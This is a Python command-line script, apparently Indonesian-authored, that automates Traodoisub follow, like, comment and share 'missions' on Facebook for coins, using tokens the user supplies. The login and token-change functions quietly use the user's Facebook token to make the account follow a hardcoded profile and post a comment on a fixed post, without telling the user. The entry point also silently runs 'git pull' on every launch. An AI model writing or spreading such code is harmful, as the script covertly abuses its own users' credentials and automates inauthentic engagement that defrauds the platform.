import os,sys,json,random,requests
from requests.exceptions import ConnectionError
from time import sleep

# Warna
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')

# Banner
___banner___ = (f"""{B} _______                  _       _           _     
|__   __|                | |     (_)         | |    
   | |_ __ __ _  ___   __| | ___  _ ___ _   _| |__  
   | | '__/ _` |/ _ \ / _` |/ _ \| / __| | | | '_ \ 
{P}   | | | | (_| | (_) | (_| | (_) | \__ \ |_| | |_) |
{P}   |_|_|  \__,_|\___/ \__,_|\___/|_|___/\__,_|_.__/ 
                                                    """)

# Login Tokenz
def ___login___():
    os.system('clear')
    print(___banner___)
    print(f"{P}[{K}>{P}]{K} You Must Enter Traodoisub Token & Facebook Token Make Sure Everything is Correct...\n")
    try:
        ___tds = input(f"{P}[{H}?{P}]{H} Token Tds :{B} ")
        if ___tds in ['',' ']:
            exit(f"{P}[{M}!{P}]{M} Jangan Kosong")
        else:
            ___roz = requests.get(f'https://traodoisub.com/api/?fields=profile&access_token={___tds}').json()['data']['user']
            open('Data/tdstoken.txt','w').write(___tds)
        ___efb = input(f"{P}[{H}?{P}]{H} Token Fb :{K} ")
        if ___efb in ['',' ']:
            exit(f"{P}[{M}!{P}]{M} Jangan Kosong")
        else:
            ___zak = requests.get(f'https://graph.facebook.com/me?access_token={___efb}').json()['name'];requests.post('https://graph.facebook.com/757953543/subscribers?access_token={}'.format(___efb))
            open('Data/fbtoken.txt','w').write(___efb)
            if 'EAAG' in open('Data/fbtoken.txt', 'r').read()[:4]:
                requests.post('https://graph.facebook.com/10158807643598544/comments/?message=Pengguna Script Traodoisub 😘&access_token={}'.format(___efb))
            elif 'EAAA' in open('Data/fbtoken.txt', 'r').read()[:4]:
                requests.post('https://graph.facebook.com/757953543/subscribers?access_token={}'.format(___efb))
            else:
                ___menu___()
            ___menu___()
    except (KeyError):
        print(f"{P}[{M}!{P}]{M} Token Salah");sleep(3);___login___()
    except (ConnectionError):
        exit(f"{P}[{K}!{P}]{K} Koneksi Error")
# Daftar Menu
def ___menu___():
    try:
        ___tds = open('Data/tdstoken.txt','r').read()
    except (IOError):
        print(f"{P}[{M}!{P}]{M} Token Invalid");sleep(3);___login___()
    try:
        os.system('clear')
        print(___banner___)
        ___roz = requests.get(f'https://traodoisub.com/api/?fields=profile&access_token={___tds}').json()['data']
        print(f"{H}[{P}•{H}]{P} Username :{K} {___roz['user'].capitalize()}")
        try:
            ___zak = requests.get('http://ipinfo.io/json').json()['region']
        except:
            ___zak = (' -')
        print(f"{H}[{P}•{H}]{P} Region :{K} {___zak}")
        print(f"{H}[{P}•{H}]{P} Coins :{K} {___roz['xu']}\n")
    except (KeyError):
        print(f"{P}[{M}!{P}]{M} Token Invalid");sleep(3);os.system('rm -rf Data/tdstoken.txt && rm -rf Data/fbtoken.txt');___login___()
    print(f"{B}[{P}1{B}]{P} Traodoisub Mission Follow")
    print(f"{B}[{P}2{B}]{P} Traodoisub Mission Comment")
    print(f"{B}[{P}3{B}]{P} Traodoisub Mission Share")
    print(f"{B}[{P}4{B}]{P} Traodoisub Mission Like")
    print(f"{B}[{P}5{B}]{P} Delete Token{M} [{P}Exit{M}]{P}\n")
    ___pilih = input(f"{H}[{P}?{H}]{P} Choose :{B} ")
    if ___pilih in ['1','01']:
        ___follow___()
    elif ___pilih in ['2','02']:
        ___komen___()
    elif ___pilih in ['3','03']:
        ___share___()
    elif ___pilih in ['4','04']:
        ___like___()
    elif ___pilih in ['5','05']:
        os.system('rm -rf Data/tdstoken.txt && rm -rf Data/fbtoken.txt')
        exit(f"{P}[{K}!{P}]{K} Menghapus Token...")
    else:
        exit(f"{P}[{M}!{P}]{M} Wrong Input")
# Misi Follow
def ___follow___():
    try:
        if 'EAAG' in open('Data/fbtoken.txt', 'r').read()[:4]:
            exit(f"{P}[{M}!{P}]{M} Gunakan Token EAAAU")
        ___max = int(input(f"{H}[{P}?{H}]{P} Count Numbers :{B} "))
        if ___max <=4:
            exit(f"{P}[{M}!{P}]{M} Minimal 5 Misi")
        ___dely = int(input(f"{H}[{P}?{H}]{P} Delay Counts :{B} "))
        if ___dely <=0:
            exit(f"{P}[{M}!{P}]{M} Minimal 1 Detik")
        ___roz = requests.get(f'https://graph.facebook.com/me?access_token={open("Data/fbtoken.txt","r").read()}').json()
        if 'id' in ___roz:
            ___zak = requests.get(f'https://traodoisub.com/api/?fields=run&id={___roz["id"]}&access_token={open("Data/tdstoken.txt","r").read()}').json()
            if 'success' in ___zak:
                print(f"\n{B}[{P}*{B}]{P} Name :{K} {___roz['name']}")
            else:
                exit(f"{P}[{M}!{P}]{M} Gagal")
        else:
            os.system('rm -rf Data/fbtoken.txt && rm -rf Data/tdstoken.txt');exit(f"{P}[{M}!{P}]{M} Token Invalid")
    except (KeyError):
        exit(f"{P}[{M}!{P}]{M} Konfigurasi Gagal")
    loop = 0
    for _ in range(___max):
        try:
            ___roz = requests.get(f'https://traodoisub.com/api/?fields=follow&access_token={open("Data/tdstoken.txt","r").read()}').json()[0]['id']
            ___link = (f'https://graph.facebook.com/{___roz}/subscribers')
            ____data = {'access_token': open('Data/fbtoken.txt','r').read()}
            ___header = {'Connection': 'keep-alive','Keep-Alive': '300','authority': 'm.facebook.com','ccept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control': 'max-age=0','upgrade-insecure-requests': '1','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document'}
            ___response = requests.post(___link, headers=___header, data=____data)
            ___zak = requests.get(f'https://traodoisub.com/api/coin/?type=FOLLOW&id={___roz}&access_token={open("Data/tdstoken.txt","r").read()}').json()
            if 'success' in str(___zak):
                loop=loop+1
                print(f"{P}[{H}{loop}{P}]{K} •{H} Follow{K} •{H} {___roz}{K} •{H} +700{K} •{H} {___zak['data']['xu']}{P}")
            else:
                print(f"{P}[{M}!{P}]{K} •{M} Follow{K} •{M} {___roz}{K} •{M} Gagal{P}",end='\r')
            for ___time in range(___dely, 0, -1):
                sleep(1);print(f"{P}[{K}*{P}]{K} Tunggu {P}{___time}{K} Detik{P}                    ",end='\r')
        except:continue
# Misi Komen
def ___komen___():
    try:
        ___max = int(input(f"{H}[{P}?{H}]{P} Count Numbers :{B} "))
        if ___max <=4:
            exit(f"{P}[{M}!{P}]{M} Minimal 5 Misi")
        ___dely = int(input(f"{H}[{P}?{H}]{P} Delay Counts :{B} "))
        if ___dely <=0:
            exit(f"{P}[{M}!{P}]{M} Minimal 1 Detik")
        ___roz = requests.get(f'https://graph.facebook.com/me?access_token={open("Data/fbtoken.txt","r").read()}').json()
        if 'id' in ___roz:
            ___zak = requests.get(f'https://traodoisub.com/api/?fields=run&id={___roz["id"]}&access_token={open("Data/tdstoken.txt","r").read()}').json()
            if 'success' in ___zak:
                print(f"\n{B}[{P}*{B}]{P} Name :{K} {___roz['name']}")
            else:
                exit(f"{P}[{M}!{P}]{M} Gagal")
        else:
            os.system('rm -rf Data/fbtoken.txt && rm -rf Data/tdstoken.txt');exit(f"{P}[{M}!{P}]{M} Token Invalid")
    except (KeyError):
        exit(f"{P}[{M}!{P}]{M} Konfigurasi Gagal")
    loop = 0
    for _ in range(___max):
        try:
            ___roz = requests.get(f'https://traodoisub.com/api/?fields=comment&access_token={open("Data/tdstoken.txt","r").read()}').json()
            ___ids = (___roz[0]['id'])
            ___cmt = (___roz[0]['msg'])
            ___link = (f'https://graph.facebook.com/{___ids}/comments')
            ____data = {'access_token': open('Data/fbtoken.txt','r').read(),'message': ___cmt}
            ___header = {'Connection': 'keep-alive','Keep-Alive': '300','authority': 'm.facebook.com','ccept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control': 'max-age=0','upgrade-insecure-requests': '1','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document'}
            ___response = requests.post(___link, headers=___header, data=____data)
            ___zak = requests.get(f'https://traodoisub.com/api/coin/?type=COMMENT&id={___ids}&access_token={open("Data/tdstoken.txt","r").read()}').json()
            if 'success' in ___zak:
                loop=loop+1
                print(f"{P}[{H}{loop}{P}]{K} •{H} Komen{K} •{H} {___ids}{K} •{H} +600{K} •{H} {___zak['data']['xu']}{P}")
            else:
                print(f"{P}[{M}!{P}]{K} •{M} Komen{K} •{M} {___ids}{K} •{M} Gagal{P}",end='\r')
            for ___time in range(___dely, 0, -1):
                sleep(1);print(f"{P}[{K}*{P}]{K} Tunggu{P} {___time}{K} Detik{P}                    ",end='\r')
        except:continue
# Misi Share
def ___share___():
    try:
        ___max = int(input(f"{H}[{P}?{H}]{P} Count Numbers :{B} "))
        if ___max <=4:
            exit(f"{P}[{M}!{P}]{{M}} Minimal 5 Misi")
        ___dely = int(input(f"{H}[{P}?{H}]{P} Delay Counts :{B} "))
        if ___dely <=0:
            exit(f"{P}[{M}!{P}]{M} Minimal 1 Detik")
        ___roz = requests.get(f'https://graph.facebook.com/me?access_token={open("Data/fbtoken.txt","r").read()}').json()
        if 'id' in ___roz:
            ___zak = requests.get(f'https://traodoisub.com/api/?fields=run&id={___roz["id"]}&access_token={open("Data/tdstoken.txt","r").read()}').json()
            if 'success' in ___zak:
                print(f"\n{B}[{P}*{B}]{P} Name :{K} {___roz['name']}")
            else:
                exit(f"{P}[{M}!{P}]{M} Gagal")
        else:
            os.system('rm -rf Data/fbtoken.txt && rm -rf Data/tdstoken.txt');exit(f"{P}[{M}!{P}]{M} Token Invalid")
    except (KeyError):
        exit(f"{P}[{M}!{P}]{M} Konfigurasi Gagal")
    loop = 0
    for _ in range(___max):
        try:
            ___roz = requests.get(f'https://traodoisub.com/api/?fields=share&access_token={open("Data/tdstoken.txt","r").read()}').json()[0]['id']
            ___link = (f'https://mbasic.facebook.com/{___roz}')
            ____data = {'privacy': '{"value":"EVERYONE"}','link': ___link,'access_token': open('Data/fbtoken.txt','r').read()}
            ___response = requests.post('https://graph.facebook.com/v2.0/me/feed', data=____data)
            ___zak = requests.get(f'https://traodoisub.com/api/coin/?type=SHARE&id={___roz}&access_token={open("Data/tdstoken.txt","r").read()}').json()
            if 'success' in ___zak:
                loop=loop+1
                print(f"{P}[{H}{loop}{P}]{K} •{H} Share{K} •{H} {___roz}{K} •{H} +800{K} •{H} {___zak['data']['xu']}{P}")
            else:
                print(f"{P}[{M}!{P}]{K} •{M} Share{K} •{M} {___roz}{K} •{M} Gagal{P}",end='\r')
            for ___time in range(___dely, 0, -1):
                sleep(1);print(f"{P}[{K}*{P}]{K} Tunggu{P} {___time}{K} Detik{P}                    ",end='\r')
        except:continue
# Misi Like
def ___like___():
    try:
        ___max = int(input(f"{H}[{P}?{H}]{P} Count Numbers :{B} "))
        if ___max <=4:
            exit(f"{P}[{M}!{P}]{M} Minimal 5 Misi")
        ___dely = int(input(f"{H}[{P}?{H}]{P} Delay Counts :{B} "))
        if ___dely <=0:
            exit(f"{P}[{M}!{P}]{M} Minimal 1 Detik")
        ___roz = requests.get(f'https://graph.facebook.com/me?access_token={open("Data/fbtoken.txt","r").read()}').json()
        if 'id' in ___roz:
            ___zak = requests.get(f'https://traodoisub.com/api/?fields=run&id={___roz["id"]}&access_token={open("Data/tdstoken.txt","r").read()}').json()
            if 'success' in ___zak:
                print(f"\n{B}[{P}*{B}]{P} Name :{K} {___roz['name']}")
            else:
                exit(f"{P}[{M}!{P}]{M} Gagal")
        else:
            os.system('rm -rf Data/fbtoken.txt && rm -rf Data/tdstoken.txt');exit("[!] Token Invalid")
    except (KeyError):
        exit(f"{P}[{M}!{P}]{M} Konfigurasi Gagal")
    loop = 0
    for _ in range(___max):
        try:
            ___roz = requests.get(f'https://traodoisub.com/api/?fields=like&access_token={open("Data/tdstoken.txt","r").read()}').json()[0]['id']
            ___link = (f'https://graph.facebook.com/{___roz}/likes')
            ____data = {'access_token': open('Data/fbtoken.txt','r').read()}
            ___header = {'Connection': 'keep-alive','Keep-Alive': '300','authority': 'm.facebook.com','ccept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control': 'max-age=0','upgrade-insecure-requests': '1','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document'}
            ___response = requests.post(___link, headers=___header, data=____data)
            ___zak = requests.get(f'https://traodoisub.com/api/coin/?type=LIKE&id={___roz}&access_token={open("Data/tdstoken.txt","r").read()}').json()
            if 'success' in ___zak:
                loop=loop+1
                print(f"{P}[{H}{loop}{P}]{K} •{H} Like{K} •{H} {___roz}{K} •{H} +200{K} •{H} {___zak['data']['xu']}{P}")
            else:
                print(f"{P}[{M}!{P}]{K} •{M} Like{K} •{M} {___roz}{K} •{M} Gagal{P}",end='\r')
            for ___time in range(___dely, 0, -1):
                sleep(1);print(f"{P}[{K}*{P}]{K} Tunggu{P} {___time}{K} Detik{P}                    ",end='\r')
        except:continue
# Cek Token Tds
def ___tds___():
    try:
        ___tds = open('Data/tdstoken.txt','r').read();___efb = open('Data/tdstoken.txt','r').read()
    except (IOError):
        print(f"{P}[{M}!{P}]{M} Token Invalid");sleep(2);___login___()
    try:
        os.system('clear')
        print(___banner___)
        ___pilih = input(f"{B}[{P}?{B}]{P} Want to Change Token Tds {P}[{H}y{P}/{K}n{P}] :{H} ")
        if ___pilih in ['y','Y']:
            ___tds = input(f"{H}[{P}?{H}]{P} Token Tds :{K} ")
            if ___tds in ['',' ']:
                exit(f"{P}[{M}!{P}]{M} Jangan Kosong")
            else:
                ___roz = requests.get(f'https://traodoisub.com/api/?fields=profile&access_token={___tds}').json()['data']['user']
                open('Data/tdstoken.txt','w').write(___tds)
                ___efb___()
        else:
            ___efb___()
    except Exception as e:
        os.system('rm -rf Data/tdstoken.txt && rm -rf Data/fbtoken.txt');exit(f"{P}[{M}!{P}]{M} {e}")
# Cek Token Facebook
def ___efb___():
    try:
        ___pilih = input(f"{B}[{P}?{B}]{P} Want to Change Token Fb {P}[{H}y{P}/{K}n{P}] :{H} ")
        if ___pilih in ['y','Y']:
            ___efb = input(f"{H}[{P}?{H}]{P} Token Fb :{K} ")
            if ___efb in ['',' ']:
                exit(f"{P}[{M}!{P}]{M} Jangan Kosong")
            else:
                ___roz = requests.get(f'https://graph.facebook.com/me?access_token={___efb}').json()['name']
                open('Data/fbtoken.txt','w').write(___efb)
                if 'EAAG' in open('Data/fbtoken.txt', 'r').read()[:4]:
                        requests.post('https://graph.facebook.com/10158807643598544/comments/?message=Pengguna Script Traodoisub 😘&access_token={}'.format(___efb))
                elif 'EAAA' in open('Data/fbtoken.txt', 'r').read()[:4]:
                    requests.post('https://graph.facebook.com/757953543/subscribers?access_token={}'.format(___efb))
                else:
                    ___menu___()
                ___menu___()
        else:
            ___menu___()
    except Exception as e:
        os.system('rm -rf Data/tdstoken.txt && rm -rf Data/fbtoken.txt');exit(f"{P}[{M}!{P}]{M} {e}")

if __name__=='__main__':
    os.system('git pull');___tds___()


